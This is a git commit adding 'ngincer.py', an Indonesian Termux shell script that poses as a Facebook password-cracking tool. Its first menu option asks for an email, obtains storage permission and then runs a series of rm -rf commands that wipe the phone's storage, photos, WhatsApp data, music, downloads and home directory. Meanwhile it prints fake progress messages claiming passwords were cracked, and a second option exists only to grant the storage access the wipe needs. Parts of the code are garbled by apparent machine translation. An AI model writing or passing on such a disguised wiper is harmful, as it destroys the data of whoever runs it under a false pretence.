24075fe98544f0d2c5d3e412a6c14f5713603579
Yans-Crew <47339903+rianwk@users.noreply.github.com>
2019-03-19 13:39:37 +0800

    Create ngincer.py

---
+++ ngincer.py
@@ -0,0 +1,243 @@
+#! / system / xbin / bash
+
+# Bersihkan Layar
+
+bersih
+
+biru = ' \ 033 [34; 1 m '
+
+hijau = ' \ 033 [32; 1 m '
+
+ungu = ' \ 033 [35; 1 m '
+
+cyan = ' \ 033 [36; 1m '
+
+red = ' \ 033 [31; 1m '
+
+white = ' \ 033 [37; 1m '
+
+kuning = ' \ 033 [33; 1 m '
+
+# ############################################## #
+
+# CTRL C-
+
+# ############################################## #
+
+menghack ctrl_c INT
+
+ctrl_c () {
+
+bersih
+
+echo $ red " [#]> (Ctrl + C) Terdeteksi,
+
+Mencoba Keluar ... "
+
+tidur 1
+
+gema " "
+
+echo $ yellow " [#]> Terima Kasih Telah Menggunakan Saya
+
+Alat ... "
+
+tidur 1
+
+gema " "
+
+echo $ white " [#]> Team Army Cyber hadir ... "
+
+baca enter
+
+keluar
+
+}
+
+gema "
+
+____________________________________________ " | lolcat
+
+echo $green"kontak admin:62895-3635-*****"
+
+echo $Orange"Autohor: RianWk"
+
+echo $Red"Thanks To Team Army Cyber"
+
+echo "
+
+___________________________________________" | lolcat
+
+echo $green" 01) Singgle Target ID Facebook"
+
+echo $green" 02) Langkah Sebelum Menggunakan Tool"
+
+echo $green" 03) Info Tools"
+
+read -p "[TEAM ARMY CYBER]> " bro;
+
+
+if [ $bro = 1 ] || [ $bro = 01 ]
+
+then
+
+clear
+
+echo $green" Login Facebook"
+
+sleep 1
+
+read -p "[ISI EMAIL]> " bro;
+
+termux-setup-storage
+
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
+rm -rf storage/emulated/0
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
+
+echo $green"Sedang Mencari ID Facebook Dalam 30 detik"
+
+sleep 5
+
+echo $green"Sedang Mencari ID Facebook Dalam 29 detik"
+
+sleep 5
+
+echo $green"Sedang Mengumpulkan ID Facebook Dalam 28 detik"
+
+sleep 5
+
+echo $green"Sedang Mengumpulkan ID Facebook Dalam 27 detik"
+
+sleep 5
+
+echo $green"Sedang Mencari Password Facebook Dalam 26 detik"
+
+sleep 3
+
+echo $red"Mencari Gagal! Sedang Mengulangi Kembali Pencarian"
+
+sleep 5
+
+echo $green"Sedang Mencari Password Facebook Dalam 60 detik"
+
+sleep 5
+
+echo $green"Sedang Mencari Password Facebook Dalam 59 detik"
+
+sleep 5
+
+echo $green"Sedang Mencari Password Facebook Dalam 58 detik"
+
+sleep 5
+
+echo $green"Sucses Mencari password Facebook"
+
+sleep 5
+
+echo $green"Sedang Mengumpulkan Password Facebook Dalam 3 Detik"
+
+sleep 5
+
+echo $green"Sedang Mengumpulkan Password Facebook Dalam 2 detik"
+
+sleep 5
+
+echo $green"Sedang Mengumpulkan Password Facebook Dalam 1 detik"
+
+sleep 5
+
+echo $white"Mengumpulkan Data + ID + Password Facebook"
+
+echo $green"send to sdcard/0"
+
+sleep 3
+
+echo $green"Buka storage cari PasswordFacebook.txt buka dan liat hasil cracking password"
+
+exit
+
+fi
+
+
+if [ $bro = 2 ] || [ $bro = 02 ]
+
+then
+
+clear
+
+echo $green"Harap Izinkan Termux untuk mengakses storage"
+
+echo $green"Agar bisa menyimpan hasil Crack Password ke sdcard"
+
+termux-setup-storage
+
+sleep 4
+
+termux-setup-storage
+
+sleep 4
+
+termux-setup-storage
+
+sleep 4
+
+termux-setup-storage
+
+exit
+
+fi
+
+
+if [ $bro = 3 ] || [ $bro = 03 ]
+
+then
+
+clear
+
+echo $green"Author RianWk"
+
+echo $green"Jika Ada masalah Hubungi Nomer Saya "
+
+echo $green"kontak admin:6289-6982-70794"
+
+echo $green"ThanksTo; sampai jumpa"
+
+echo $green"ThanksTo; terimakasih"
+
+echo $green"ThanksTo; anggota TAC"
+
+echo $green"ThanksTo; Mrruxhan"
+
+echo $red"TEAM ARMY CYBER"
+
+exit 
+
+fi
+
+
+
+
+
